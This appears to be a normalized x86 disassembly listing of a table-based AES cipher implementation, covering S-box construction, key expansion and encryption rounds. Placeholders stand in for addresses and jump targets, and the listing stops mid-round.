sub_401000
push ecx
push ecx
push ebx
push ebp
push esi
push edi
xor ecx ecx
mov al 0x1
movzx edx al
mov bl al
mov [ ecx + rw-data ] al
mov [ edx + rw-data ] cl
mov dl al
and dl 0x80
neg dl
sbb dl dl
and edx 0x1b
shl bl 0x1
xor dl bl
xor al dl
inc ecx
cmp ecx 0x100
jb r-xdata
and [ rw-data ] 0x0
mov al 0x1
mov ecx rw-data
movzx edx al
mov [ ecx ] edx
mov dl al
and dl 0x80
neg dl
sbb dl dl
add ecx 0x4
and edx 0x1b
shl al 0x1
xor al dl
cmp ecx rw-data
jl r-xdata
xor edx edx
xor bl bl
movzx eax [ edx + rw-data ]
mov ecx rw-data
sub ecx eax
mov bl [ ecx ]
jmp r-xdata
test edx edx
je r-xdata
xor edi edi
mov al bl
mov cl bl
shr al 0x7
shl cl 0x1
or al cl
mov cl al
xor bl al
shr cl 0x7
shl al 0x1
or cl al
mov al cl
xor bl cl
shr al 0x7
shl cl 0x1
or al cl
mov cl al
xor bl al
shr cl 0x7
shl al 0x1
or cl al
xor cl bl
xor cl 0x63
movzx eax cl
mov [ edx + rw-data ] cl
mov [ eax + rw-data ] dl
inc edx
cmp edx 0x100
jb r-xdata
xor ebp ebp
movzx eax [ esi + rw-data ]
movzx edx [ rw-data ]
add eax edx
mov ebp 0xff
cdq
idiv ebp
movzx ebp [ edx + rw-data ]
jmp r-xdata
xor eax eax
movzx eax [ esi + rw-data ]
movzx edx [ rw-data ]
add eax edx
mov ebx 0xff
cdq
idiv ebx
movzx eax [ edx + rw-data ]
jmp r-xdata
test bl bl
je r-xdata
and [ esp + 0x14 ] 0x0
movzx eax [ esi + rw-data ]
movzx edx [ rw-data ]
add eax edx
mov ebp 0xff
cdq
idiv ebp
movzx eax [ edx + rw-data ]
mov [ esp + 0x14 ] eax
jmp r-xdata
shl eax 0x8
or eax esi
mov bl [ edi + rw-data ]
shl eax 0x8
or eax esi
shl eax 0x8
or eax ebp
mov edx eax
mov [ ecx + rw-data ] eax
rol edx 0x8
mov [ ecx + rw-data ] edx
mov edx eax
rol edx 0x10
movzx esi bl
rol eax 0x18
mov [ ecx + rw-data ] edx
mov [ ecx + rw-data ] eax
mov eax esi
mov [ ecx + rw-data ] esi
rol eax 0x8
mov [ ecx + rw-data ] eax
mov eax esi
rol eax 0x10
mov [ ecx + rw-data ] eax
mov eax esi
rol eax 0x18
test bl bl
mov [ ecx + rw-data ] eax
je r-xdata
and [ esp + 0x10 ] 0x0
movzx eax [ esi + rw-data ]
movzx edx [ rw-data ]
add eax edx
mov ebp 0xff
cdq
idiv ebp
movzx eax [ edx + rw-data ]
mov [ esp + 0x10 ] eax
jmp r-xdata
test bl bl
je r-xdata
xor ebp ebp
movzx eax [ esi + rw-data ]
movzx edx [ rw-data ]
add eax edx
mov ebp 0xff
cdq
idiv ebp
movzx ebp [ edx + rw-data ]
jmp r-xdata
test bl bl
je r-xdata
xor eax eax
movzx eax [ esi + rw-data ]
movzx edx [ rw-data ]
add eax edx
mov esi 0xff
cdq
idiv esi
movzx eax [ edx + rw-data ]
jmp r-xdata
test bl bl
je r-xdata
mov bl [ edi + rw-data ]
mov ecx edi
movzx esi bl
shl ecx 0x2
mov eax esi
rol eax 0x8
mov [ ecx + rw-data ] esi
mov [ ecx + rw-data ] eax
mov eax esi
rol eax 0x10
mov [ ecx + rw-data ] eax
mov eax esi
rol eax 0x18
test bl bl
mov [ ecx + rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
pop ebx
pop ecx
pop ecx
retn
shl eax 0x8
or eax ebp
shl eax 0x8
or eax [ esp + 0x10 ]
shl eax 0x8
or eax [ esp + 0x14 ]
inc edi
mov edx eax
mov [ ecx + rw-data ] eax
rol edx 0x8
mov [ ecx + rw-data ] edx
mov edx eax
rol edx 0x10
rol eax 0x18
mov [ ecx + rw-data ] edx
cmp edi 0x100
mov [ ecx + rw-data ] eax
jl r-xdata
sub_4012b0
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
mov esi ecx
jne r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1f ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
mov [ esi + 0x4 ] ecx
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0xc ]
sub ecx 0x4
mov [ esi + 0x14 ] edx
je r-xdata
call sub_401000
mov eax edx
mov edi rw-data
lea ecx [ esi + 0x18 ]
dec ecx
dec ecx
je r-xdata
ror eax 0x8
mov ebx eax
mov edx eax
shr ebx 0x10
shr edx 0x18
movzx ebx bl
mov edx [ edx * 4 + rw-data ]
xor edx [ ebx * 4 + rw-data ]
mov ebx eax
shr ebx 0x8
movzx ebx bl
movzx eax al
xor edx [ ebx * 4 + rw-data ]
xor edx [ eax * 4 + rw-data ]
xor edx [ ecx - 0x10 ]
xor edx [ edi ]
add edi 0x4
mov eax edx
mov [ ecx ] eax
xor eax [ ecx - 0xc ]
mov [ ecx + 0x4 ] eax
xor eax [ ecx - 0x8 ]
mov [ ecx + 0x8 ] eax
xor eax [ ecx - 0x4 ]
mov [ ecx + 0xc ] eax
add ecx 0x10
cmp edi rw-data
jl r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov [ esi + 0x108 ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x10c ] eax
mov eax [ esi + 0x10 ]
mov [ esi + 0x110 ] eax
mov eax [ esi + 0x14 ]
push 0x4
mov [ esi + 0x114 ] eax
pop eax
lea ecx [ ecx * 4 + 0x18 ]
cmp ecx eax
mov [ ebp + 0x8 ] eax
jbe r-xdata
mov ecx [ eax + 0x10 ]
mov edi rw-data
mov [ esi + 0x18 ] ecx
mov eax [ eax + 0x14 ]
mov [ esi + 0x1c ] eax
lea ecx [ esi + 0x20 ]
dec ecx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ esi + 0x18 ]
mov [ ebp - 0x4 ] eax
ror eax 0x8
mov ebx eax
mov edx eax
shr ebx 0x10
shr edx 0x18
movzx ebx bl
mov edx [ edx * 4 + rw-data ]
xor edx [ ebx * 4 + rw-data ]
mov ebx eax
shr ebx 0x8
movzx ebx bl
movzx eax al
xor edx [ ebx * 4 + rw-data ]
xor edx [ eax * 4 + rw-data ]
xor edx [ ecx - 0x18 ]
xor edx [ edi ]
add edi 0x4
mov eax edx
mov [ ecx ] eax
xor eax [ ecx - 0x14 ]
mov [ ecx + 0x4 ] eax
xor eax [ ecx - 0x10 ]
mov [ ecx + 0x8 ] eax
xor eax [ ecx - 0xc ]
mov [ ecx + 0xc ] eax
xor eax [ ecx - 0x8 ]
mov [ ecx + 0x10 ] eax
xor eax [ ecx - 0x4 ]
mov [ ecx + 0x14 ] eax
add ecx 0x18
cmp edi rw-data
jl r-xdata
jmp r-xdata
mov ecx [ eax + 0x10 ]
mov edi rw-data
mov [ esi + 0x18 ] ecx
mov ecx [ eax + 0x14 ]
mov [ esi + 0x1c ] ecx
mov ecx [ eax + 0x18 ]
mov [ esi + 0x20 ] ecx
mov eax [ eax + 0x1c ]
mov [ esi + 0x24 ] eax
lea ecx [ esi + 0x28 ]
mov edi [ eax ]
mov ebx 0x1010101
mov eax edi
mov ecx edi
shr eax 0x7
and eax ebx
and ecx 0xff7f7f7f
imul eax eax 0x1b
shl ecx 0x1
xor eax ecx
mov ecx eax
mov edx eax
shr ecx 0x7
and ecx ebx
and edx 0xff7f7f7f
imul ecx ecx 0x1b
shl edx 0x1
xor ecx edx
mov edx ecx
shr edx 0x7
and edx ebx
mov ebx ecx
imul edx edx 0x1b
and ebx 0xff7f7f7f
shl ebx 0x1
xor edx ebx
mov ebx ecx
xor edi edx
mov [ ebp + 0xc ] edi
xor ebx edi
mov edi eax
xor edi [ ebp + 0xc ]
ror ebx 0x10
ror edi 0x8
xor ebx edi
mov edi [ ebp + 0xc ]
ror edi 0x18
xor ebx edi
xor ebx edx
xor ebx ecx
xor ebx eax
mov eax [ ebp - 0x4 ]
inc [ ebp + 0x8 ]
mov [ eax + 0x100 ] ebx
mov ecx [ esi + 0x4 ]
add eax 0x4
lea ecx [ ecx * 4 + 0x18 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] ecx
jb r-xdata
mov edx eax
ror edx 0x8
mov ebx edx
mov eax edx
shr ebx 0x10
shr eax 0x18
movzx ebx bl
mov eax [ eax * 4 + rw-data ]
xor eax [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x8
movzx ebx bl
movzx edx dl
xor eax [ ebx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
xor eax [ ecx - 0x20 ]
xor eax [ edi ]
add edi 0x4
mov [ ecx ] eax
xor eax [ ecx - 0x1c ]
mov [ ecx + 0x4 ] eax
xor eax [ ecx - 0x18 ]
mov [ ecx + 0x8 ] eax
xor eax [ ecx - 0x14 ]
mov ebx eax
mov edx eax
shr ebx 0x10
shr edx 0x18
movzx ebx bl
mov [ ecx + 0xc ] eax
mov edx [ edx * 4 + rw-data ]
xor edx [ ebx * 4 + rw-data ]
mov ebx eax
shr ebx 0x8
movzx ebx bl
movzx eax al
xor edx [ ebx * 4 + rw-data ]
add ecx 0x20
xor edx [ eax * 4 + rw-data ]
xor edx [ ecx - 0x30 ]
mov eax edx
mov [ ecx - 0x10 ] eax
xor eax [ ecx - 0x2c ]
mov [ ecx - 0xc ] eax
xor eax [ ecx - 0x28 ]
mov [ ecx - 0x8 ] eax
xor eax [ ecx - 0x24 ]
cmp edi rw-data
mov [ ecx - 0x4 ] eax
jl r-xdata
jmp r-xdata
sub_4015a4
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
mov ecx [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
mov edx [ ebx + 0x8 ]
xor ecx [ ebx + 0xc ]
xor edx [ eax ]
xor esi [ ebx + 0x10 ]
push edi
mov edi [ eax + 0xc ]
xor edi [ ebx + 0x14 ]
lea eax [ ebx + 0x18 ]
mov ebx [ ebx + 0x4 ]
mov [ ebp - 0x14 ] edx
cmp ebx 0x6
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] ebx
jbe r-xdata
cmp [ ebp - 0x4 ] 0x4
jbe r-xdata
mov ebx edi
shr ebx 0x18
mov [ ebp + 0x8 ] ebx
mov ebx esi
mov esi [ ebp + 0x8 ]
shr ebx 0x10
mov esi [ esi * 4 + rw-data ]
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x10
xor esi [ eax ]
add eax 0x10
mov [ ebp - 0x24 ] esi
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x8
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
shr ecx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x8
xor esi [ eax - 0xc ]
mov [ ebp - 0x20 ] esi
movzx esi bl
mov ebx [ esi * 4 + rw-data ]
mov esi [ ebp - 0xc ]
xor ebx [ ecx * 4 + rw-data ]
mov ecx edx
shr ecx 0x10
movzx ecx cl
shr esi 0x18
xor ebx [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x10
movzx ecx cl
shr edx 0x8
xor esi [ ecx * 4 + rw-data ]
xor ebx [ eax - 0x8 ]
movzx ecx dl
mov edx ebx
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x8 ]
shr edx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx edx dl
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x18 ] esi
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x8
movzx edx dl
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x24 ]
xor ecx [ edx * 4 + rw-data ]
xor ecx [ eax ]
mov edx ecx
mov ecx esi
shr ecx 0x10
movzx esi cl
mov ecx ebx
mov [ ebp - 0x14 ] edx
shr ecx 0x8
mov esi [ esi * 4 + rw-data ]
movzx ecx cl
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x20 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
xor esi [ eax + 0x4 ]
movzx ecx cl
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x20 ]
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
shr esi 0x18
movzx ecx cl
xor edi [ esi * 4 + rw-data ]
xor edi [ ecx * 4 + rw-data ]
movzx ecx bl
shr ebx 0x18
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
xor edi [ eax + 0x8 ]
movzx ecx cl
mov [ ebp - 0xc ] edi
mov edi [ ebx * 4 + rw-data ]
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
movzx ecx cl
mov esi [ ebp - 0xc ]
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor edi [ eax + 0xc ]
add eax 0x10
mov [ ebp - 0x8 ] edi
mov ebx esi
shr ebx 0x10
shr edi 0x18
movzx esi bl
mov ebx [ edi * 4 + rw-data ]
xor ebx [ esi * 4 + rw-data ]
shr ecx 0x8
movzx ecx cl
xor ebx [ ecx * 4 + rw-data ]
movzx ecx dl
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x10
movzx esi cl
mov ecx [ ebp - 0xc ]
xor ebx [ eax ]
mov esi [ esi * 4 + rw-data ]
add eax 0x10
shr ecx 0x8
movzx ecx cl
mov [ ebp - 0x24 ] ebx
xor esi [ ecx * 4 + rw-data ]
mov ecx edx
shr ecx 0x18
shr edx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x10 ]
movzx edx dl
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
xor esi [ eax - 0xc ]
movzx ecx cl
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
shr esi 0x18
xor ecx [ esi * 4 + rw-data ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0xc ]
movzx esi dl
shr edx 0x18
xor ecx [ esi * 4 + rw-data ]
mov [ ebp + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov esi [ ebp + 0x8 ]
shr edx 0x10
mov esi [ esi * 4 + rw-data ]
xor ecx [ eax - 0x8 ]
movzx edx dl
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x8
movzx edx dl
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
xor esi [ edx * 4 + rw-data ]
mov edx ecx
shr edx 0x10
xor esi [ eax - 0x4 ]
movzx edx dl
mov edi esi
mov [ ebp - 0x18 ] esi
shr edi 0x18
mov edi [ edi * 4 + rw-data ]
xor edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x8
movzx edx dl
xor edi [ edx * 4 + rw-data ]
movzx edx bl
xor edi [ edx * 4 + rw-data ]
mov edx esi
shr edx 0x10
xor edi [ eax ]
mov [ ebp - 0x14 ] edi
movzx edi dl
mov edx ecx
mov edi [ edi * 4 + rw-data ]
shr edx 0x8
movzx edx dl
xor edi [ edx * 4 + rw-data ]
mov edx ebx
shr edx 0x18
shr ebx 0x10
xor edi [ edx * 4 + rw-data ]
add eax 0x10
movzx edx [ ebp - 0x20 ]
xor edi [ edx * 4 + rw-data ]
mov edx esi
mov esi [ ebp - 0x20 ]
shr edx 0x8
movzx edx dl
shr esi 0x18
mov edx [ edx * 4 + rw-data ]
xor edi [ eax - 0xc ]
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] edi
xor edx [ esi * 4 + rw-data ]
movzx esi cl
shr ecx 0x18
xor edx [ esi * 4 + rw-data ]
mov esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ebx 0x10
movzx edi bl
shr ecx 0x8
xor esi [ edi * 4 + rw-data ]
xor edx [ eax - 0x8 ]
movzx ecx cl
mov ebx edx
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ebx bl
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x18
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor edi [ ebx * 4 + rw-data ]
mov ebx edx
shr ecx 0x8
movzx ecx cl
shr ebx 0x8
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x14 ]
movzx ebx bl
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x10
xor edi [ eax ]
movzx ecx cl
mov [ ebp - 0x24 ] edi
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
xor edi [ ebx * 4 + rw-data ]
shr ecx 0x18
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x10 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x8
mov esi [ ebp - 0x10 ]
xor edi [ eax + 0x4 ]
movzx ecx cl
shr esi 0x18
mov ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
xor ebx [ esi * 4 + rw-data ]
mov [ ebp - 0x20 ] edi
shr ecx 0x10
movzx ecx cl
xor ebx [ ecx * 4 + rw-data ]
movzx ecx dl
xor ebx [ ecx * 4 + rw-data ]
xor ebx [ eax + 0x8 ]
shr edx 0x18
mov ecx [ ebp - 0x10 ]
mov esi [ edx * 4 + rw-data ]
shr ecx 0x10
movzx ecx cl
mov edx ebx
add eax 0x10
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
movzx ecx cl
shr edx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x8 ]
movzx edx dl
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x18 ] esi
shr ecx 0x18
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
xor edi [ edx * 4 + rw-data ]
mov edx ebx
shr ecx 0x8
movzx ecx cl
shr edx 0x8
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x24 ]
movzx edx dl
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x10
xor edi [ eax ]
add eax 0x10
movzx ecx cl
mov [ ebp - 0x14 ] edi
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
xor edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr ecx 0x18
shr edx 0x18
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x20 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x8
movzx ecx cl
xor edi [ eax - 0xc ]
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x10
movzx edx dl
mov [ ebp - 0x10 ] edi
xor ecx [ edx * 4 + rw-data ]
movzx edx bl
shr ebx 0x18
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
mov esi [ ebx * 4 + rw-data ]
shr edx 0x10
movzx edx dl
xor ecx [ eax - 0x8 ]
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x8
movzx edx dl
mov ebx ecx
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x18 ]
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
movzx ebx bl
xor esi [ eax - 0x4 ]
mov edx esi
mov [ ebp - 0x8 ] esi
shr edx 0x18
mov edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
xor edi [ ebx * 4 + rw-data ]
shr edx 0x8
movzx edx dl
mov ebx ecx
xor edi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x14 ]
shr ebx 0x8
xor edi [ edx * 4 + rw-data ]
mov edx esi
shr edx 0x10
xor edi [ eax ]
add eax 0x10
movzx edx dl
movzx ebx bl
mov [ ebp - 0x24 ] edi
mov edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
xor edi [ ebx * 4 + rw-data ]
shr edx 0x18
mov ebx [ ebp - 0x14 ]
xor edi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x10 ]
shr ebx 0x10
xor edi [ edx * 4 + rw-data ]
mov edx esi
mov esi [ ebp - 0x10 ]
shr edx 0x8
movzx edx dl
shr esi 0x18
mov edx [ edx * 4 + rw-data ]
xor edi [ eax - 0xc ]
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edi
xor edx [ esi * 4 + rw-data ]
movzx esi cl
shr ecx 0x18
xor edx [ esi * 4 + rw-data ]
mov esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ebx 0x10
movzx edi bl
shr ecx 0x8
xor esi [ edi * 4 + rw-data ]
xor edx [ eax - 0x8 ]
movzx ecx cl
mov ebx edx
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x8 ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ebx bl
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x18 ] esi
shr ecx 0x18
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
xor edi [ ebx * 4 + rw-data ]
mov ebx edx
shr ecx 0x8
movzx ecx cl
shr ebx 0x8
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x24 ]
movzx ebx bl
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x10
xor edi [ eax ]
movzx ecx cl
mov [ ebp - 0x14 ] edi
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
xor edi [ ebx * 4 + rw-data ]
shr ecx 0x18
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x20 ]
xor edi [ ecx * 4 + rw-data ]
xor edi [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov ecx esi
mov esi [ ebp - 0x20 ]
shr ecx 0x8
movzx ecx cl
shr esi 0x18
mov ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
xor ebx [ esi * 4 + rw-data ]
add eax 0x10
shr ecx 0x10
movzx ecx cl
xor ebx [ ecx * 4 + rw-data ]
movzx ecx dl
shr edx 0x18
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
mov esi [ edx * 4 + rw-data ]
shr ecx 0x10
movzx ecx cl
xor ebx [ eax - 0x8 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
movzx ecx cl
mov edx ebx
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
shr edx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx edx dl
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x18
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor edi [ edx * 4 + rw-data ]
mov edx ebx
shr ecx 0x8
movzx ecx cl
shr edx 0x8
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x14 ]
movzx edx dl
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x10
xor edi [ eax ]
movzx ecx cl
mov [ ebp - 0x24 ] edi
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
xor edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr ecx 0x18
shr edx 0x18
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x10 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x8
movzx ecx cl
xor edi [ eax + 0x4 ]
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x10
movzx edx dl
mov [ ebp - 0x20 ] edi
xor ecx [ edx * 4 + rw-data ]
movzx edx bl
shr ebx 0x18
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
mov esi [ ebx * 4 + rw-data ]
shr edx 0x10
xor ecx [ eax + 0x8 ]
movzx edx dl
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x8
movzx edx dl
mov ebx ecx
add eax 0x10
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
movzx ebx bl
xor esi [ eax - 0x4 ]
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x18
mov edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
xor edi [ ebx * 4 + rw-data ]
mov ebx ecx
shr edx 0x8
movzx edx dl
shr ebx 0x8
xor edi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x24 ]
movzx ebx bl
xor edi [ edx * 4 + rw-data ]
mov edx esi
shr edx 0x10
xor edi [ eax ]
add eax 0x10
movzx edx dl
mov [ ebp - 0x14 ] edi
mov edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
xor edi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x24 ]
shr edx 0x18
shr ebx 0x10
xor edi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x20 ]
xor edi [ edx * 4 + rw-data ]
mov edx esi
mov esi [ ebp - 0x20 ]
shr edx 0x8
movzx edx dl
shr esi 0x18
mov edx [ edx * 4 + rw-data ]
xor edi [ eax - 0xc ]
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] edi
xor edx [ esi * 4 + rw-data ]
movzx esi cl
shr ecx 0x18
xor edx [ esi * 4 + rw-data ]
mov esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ebx 0x10
movzx edi bl
shr ecx 0x8
xor esi [ edi * 4 + rw-data ]
xor edx [ eax - 0x8 ]
movzx ecx cl
mov ebx edx
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ebx bl
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x18
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor edi [ ebx * 4 + rw-data ]
shr ecx 0x8
movzx ecx cl
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x14 ]
xor edi [ ecx * 4 + rw-data ]
xor edi [ eax ]
mov [ ebp - 0x24 ] edi
mov ecx esi
mov ebx edx
shr ecx 0x10
movzx ecx cl
shr ebx 0x8
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
movzx ebx bl
shr ecx 0x18
xor edi [ ebx * 4 + rw-data ]
add eax 0x10
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x10 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx esi
shr ecx 0x8
mov esi [ ebp - 0x10 ]
xor edi [ eax - 0xc ]
movzx ecx cl
shr esi 0x18
mov ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
xor ebx [ esi * 4 + rw-data ]
mov [ ebp - 0x20 ] edi
shr ecx 0x10
movzx ecx cl
xor ebx [ ecx * 4 + rw-data ]
movzx ecx dl
shr edx 0x18
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
mov edx [ edx * 4 + rw-data ]
shr ecx 0x10
movzx ecx cl
xor ebx [ eax - 0x8 ]
xor edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
movzx ecx cl
xor edx [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x8 ]
xor edx [ ecx * 4 + rw-data ]
mov ecx ebx
shr ecx 0x10
xor edx [ eax - 0x4 ]
movzx ecx cl
mov esi edx
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ecx * 4 + rw-data ]
mov ecx edi
shr ecx 0x8
movzx ecx cl
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x24 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx edx
shr ecx 0x10
